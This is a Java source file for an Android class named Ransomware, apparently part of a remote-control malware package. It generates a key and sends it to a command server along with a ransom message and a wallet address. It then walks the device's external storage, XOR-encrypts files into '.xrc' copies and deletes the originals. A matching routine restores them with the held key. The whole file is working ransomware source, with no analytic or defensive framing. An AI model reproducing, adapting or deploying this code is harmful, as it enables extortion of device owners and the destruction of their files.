package com.xrc.system.features;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.core.CryptoManager;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.Arrays;

public class Ransomware {
    private static final String TAG = Constants.TAG + ":Ransom";
    private static final String EXT = ".xrc";
    private static final int MAX_DEPTH = 10;
    private static final long MAX_FILE_SIZE = 100 * 1024 * 1024; // 100MB limit
    private static Ransomware instance;
    private final Context ctx;
    private final CryptoManager crypto;
    private final SecureRandom random;
    private volatile byte[] currentKey;

    private Ransomware(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.crypto = new CryptoManager();
        this.random = new SecureRandom();
    }

    public static synchronized Ransomware get(Context ctx) {
        if (instance == null) instance = new Ransomware(ctx);
        return instance;
    }

    public void encryptDevice(String msg, String wallet) {
        new Thread(() -> {
            try {
                synchronized (this) {
                    currentKey = crypto.generateRandomBytes(32);
                }
                String keyB64 = Base64.encodeToString(currentKey, Base64.NO_WRAP);
                JSONObject ransomInfo = new JSONObject();
                ransomInfo.put("key", keyB64);
                ransomInfo.put("msg", msg);
                ransomInfo.put("wallet", wallet);
                XRCWebSocketClient.get(ctx).sendEvent("ransom_key", ransomInfo);

                File root = Environment.getExternalStorageDirectory();
                if (root != null && root.exists()) {
                    encryptDir(root, 0);
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    // Scoped storage: also target app-specific dirs
                    File[] mediaDirs = ctx.getExternalMediaDirs();
                    if (mediaDirs != null) {
                        for (File dir : mediaDirs) {
                            if (dir != null && dir.exists()) {
                                encryptDir(dir, 0);
                            }
                        }
                    }
                }

                XRCWebSocketClient.get(ctx).sendEvent("ransom_complete", new JSONObject());
            } catch (Exception e) {
                Log.e(TAG, "Encryption failed", e);
            }
        }).start();
    }

    public void decryptDevice() {
        new Thread(() -> {
            try {
                synchronized (this) {
                    if (currentKey == null) {
                        Log.e(TAG, "No decryption key available");
                        return;
                    }
                }
                File root = Environment.getExternalStorageDirectory();
                if (root != null && root.exists()) {
                    decryptDir(root, 0);
                }
                XRCWebSocketClient.get(ctx).sendEvent("decrypt_complete", new JSONObject());
            } catch (Exception e) {
                Log.e(TAG, "Decryption failed", e);
            }
        }).start();
    }

    private void encryptDir(File dir, int depth) {
        if (depth > MAX_DEPTH) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                String name = f.getName();
                if (!name.startsWith(".") && !name.equals("Android") && !name.equals("DCIM")
                        && !name.equals("Pictures") && !name.equals("Movies")) {
                    encryptDir(f, depth + 1);
                }
            } else {
                encryptFile(f);
            }
        }
    }

    private void decryptDir(File dir, int depth) {
        if (depth > MAX_DEPTH) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                decryptDir(f, depth + 1);
            } else if (f.getName().endsWith(EXT)) {
                decryptFile(f);
            }
        }
    }

    private void encryptFile(File file) {
        if (file.length() > MAX_FILE_SIZE) return;
        if (file.getName().endsWith(EXT)) return; // Already encrypted
        try (FileInputStream fis = new FileInputStream(file)) {
            long fileSize = file.length();
            byte[] data = new byte[(int) fileSize];
            int read = fis.read(data);
            if (read != fileSize) {
                Log.w(TAG, "Partial read: " + file.getName());
                return;
            }
            byte[] key;
            synchronized (this) {
                key = currentKey != null ? currentKey.clone() : null;
            }
            if (key == null) return;
            byte[] encrypted = xorEncrypt(data, key);
            File out = new File(file.getAbsolutePath() + EXT);
            try (FileOutputStream fos = new FileOutputStream(out)) {
                fos.write(encrypted);
            }
            if (!file.delete()) {
                Log.w(TAG, "Could not delete original: " + file.getName());
            }
        } catch (Exception e) {
            Log.e(TAG, "Encrypt failed: " + file.getName(), e);
        }
    }

    private void decryptFile(File file) {
        try (FileInputStream fis = new FileInputStream(file)) {
            long fileSize = file.length();
            byte[] data = new byte[(int) fileSize];
            int read = fis.read(data);
            if (read != fileSize) {
                Log.w(TAG, "Partial read: " + file.getName());
                return;
            }
            byte[] key;
            synchronized (this) {
                key = currentKey != null ? currentKey.clone() : null;
            }
            if (key == null) return;
            byte[] decrypted = xorEncrypt(data, key);
            String origPath = file.getAbsolutePath();
            String outPath = origPath.substring(0, origPath.length() - EXT.length());
            File out = new File(outPath);
            try (FileOutputStream fos = new FileOutputStream(out)) {
                fos.write(decrypted);
            }
            if (!file.delete()) {
                Log.w(TAG, "Could not delete encrypted: " + file.getName());
            }
        } catch (Exception e) {
            Log.e(TAG, "Decrypt failed: " + file.getName(), e);
        }
    }

    private byte[] xorEncrypt(byte[] data, byte[] key) {
        byte[] out = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            out[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return out;
    }
}
